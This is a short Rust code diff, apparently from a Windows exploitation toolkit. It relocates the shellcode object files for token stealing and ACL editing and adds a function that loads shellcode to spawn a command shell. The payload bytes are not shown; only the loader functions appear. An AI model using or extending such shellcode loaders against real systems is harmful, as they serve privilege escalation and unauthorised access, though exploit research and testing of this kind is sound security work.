@@ -59,13 +59,19 @@ fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
 
 #[cfg(target_os = "windows")]
 pub fn token_stealing_shellcode() -> Vec<u8> {
-    let shellcode_obj = include_bytes!("token_stealing.obj");
+    let shellcode_obj = include_bytes!("asm/token_stealing.obj");
     extract_shellcode_from_obj(shellcode_obj)
 }
 
 #[cfg(target_os = "windows")]
 pub fn acl_edit_shellcode() -> Vec<u8> {
-    let shellcode_obj = include_bytes!("acl_edit.obj");
+    let shellcode_obj = include_bytes!("asm/acl_edit.obj");
+    extract_shellcode_from_obj(shellcode_obj)
+}
+
+#[cfg(target_os = "windows")]
+pub fn spawn_cmd_shellcode() -> Vec<u8> {
+    let shellcode_obj = include_bytes!("asm/spawn_cmd.obj");
     extract_shellcode_from_obj(shellcode_obj)
 }
 
